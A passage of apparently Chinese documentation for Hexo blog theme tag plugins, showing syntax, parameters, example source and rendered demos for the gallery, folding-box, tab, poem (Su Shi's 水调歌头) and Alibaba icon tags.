type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-19-相册-gallery">2.19 相册 gallery</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 圖片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>gallerygroup 相册图库</li></ul><table><thead><tr><th>参数名</th><th>释义</th></tr></thead><tbody><tr><td>name</td><td>图库名字</td></tr><tr><td>description</td><td>图库描述</td></tr><tr><td>link</td><td>链接到对应相册的地址</td></tr><tr><td>img-url</td><td>图库封面</td></tr></tbody></table><ul><li><p>gallery 相册</p><p>区别于旧版的Gallery相册,新的Gallery相册会自动根据图片长度进行排版，书写也更加方便，与markdown格式一样。可根据需要插入到相应的md。无需再自己配置长宽。<strong>建议在粘贴时故意使用长短、大小、横竖不一的图片</strong>，会有更好的效果。（尺寸完全相同的图片只会平铺输出，效果很糟糕）</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC 在Rikkaの六花服务器里留下的足迹 &#x27;/gallery/MC/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam 哦咧哇gundam哒！ &#x27;/gallery/Gundam/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar 某种意义上也算自拍吧 &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.gallerygroup 相册图库</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>在Rikkaの六花服务器里留下的足迹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>哦咧哇gundam哒！</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>某种意义上也算自拍吧</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div>2.gallery 相册<div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""></p>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-20-折叠框-folding">2.20 折叠框 folding</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><!-- tab 参数配置 --><ol><li><p><code>颜色</code>：blue, cyan, green, yellow, red</p></li><li><p><code>状态</code>：状态填写 open 代表默认打开。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line">假装这里有代码块（代码块没法嵌套代码块）</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><details class="folding-tag" ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details class="folding-tag" green><summary> 查看代码测试 </summary>              <div class='content'>              <p>假装这里有代码块（代码块没法嵌套代码块）</p>              </div>            </details><details class="folding-tag" yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details class="folding-tag" blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <span><img src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-21-分栏-tab">2.21 分栏 tab</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>Unique name :</p><ul><li><p>选项卡块标签的唯一名称，不带逗号。</p></li><li><p>将在#id中用作每个标签及其索引号的前缀。</p></li><li><p>如果名称中包含空格，则对于生成#id，所有空格将由破折号代替。</p></li><li><p>仅当前帖子/页面的URL必须是唯一的！</p></li></ul></li><li><p>[index]:</p><ul><li><p>活动选项卡的索引号。</p></li><li><p>如果未指定，将选择第一个标签（1）。</p></li><li><p>如果index为-1，则不会选择任何选项卡。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[Tab caption]:</p><ul><li><p>当前选项卡的标题。</p></li><li><p>如果未指定标题，则带有制表符索引后缀的唯一名称将用作制表符的标题。</p></li><li><p>如果未指定标题，但指定了图标，则标题将为空。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[@icon]:</p><ul><li><p>FontAwesome图标名称（全名，看起来像“ fas fa-font”）</p></li><li><p>可以指定带空格或不带空格；</p></li><li><p>例如’Tab caption @icon’ 和 ‘Tab caption@icon’.</p></li><li><p>可选参数。</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>2.Demo 2 - 预设选择tabs</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>3.Demo 3 - 没有预设值</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一个Tab --&gt;</span><br><span class="line"><span class="strong">**tab名字为第一个Tab**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"><span class="strong">**只有图标 没有Tab名字**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸弹@fas fa-bomb --&gt;</span><br><span class="line"><span class="strong">**名字+icon**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.Demo 1 - 预设选择第一个【默认】</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>2.Demo 2 - 预设选择tabs</p><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>3.Demo 3 - 没有预设值</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字为第一个Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-22-诗词标签-poem">2.22 诗词标签 poem</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><ol><li><code>title</code>：诗词标题</li><li><code>author</code>：作者，可以不写</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% poem 水调歌头,苏轼 %&#125;</span><br><span class="line">丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。</span><br><span class="line">明月几时有？把酒问青天。</span><br><span class="line">不知天上宫阙，今夕是何年？</span><br><span class="line">我欲乘风归去，又恐琼楼玉宇，高处不胜寒。</span><br><span class="line">起舞弄清影，何似在人间？</span><br><span class="line"></span><br><span class="line">转朱阁，低绮户，照无眠。</span><br><span class="line">不应有恨，何事长向别时圆？</span><br><span class="line">人有悲欢离合，月有阴晴圆缺，此事古难全。</span><br><span class="line">但愿人长久，千里共婵娟。</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br>明月几时有？把酒问青天。<br>不知天上宫阙，今夕是何年？<br>我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>起舞弄清影，何似在人间？</p><p>转朱阁，低绮户，照无眠。<br>不应有恨，何事长向别时圆？<br>人有悲欢离合，月有阴晴圆缺，此事古难全。<br>但愿人长久，千里共婵娟。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-23-阿里图标-icon">2.23 阿里图标 icon</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>icon-xxxx</code>：表示图标<code>font-class</code>,可以在自己的阿里矢量图标库项目的<code>font-class</code>引用方案内查询并复制。</li><li><code>font-size</code>：表示图标大小，直接填写数字即可，单位为<code>em</code>。图标大小默认值为<code>1em</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rat_zi"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg><svg class="icon" 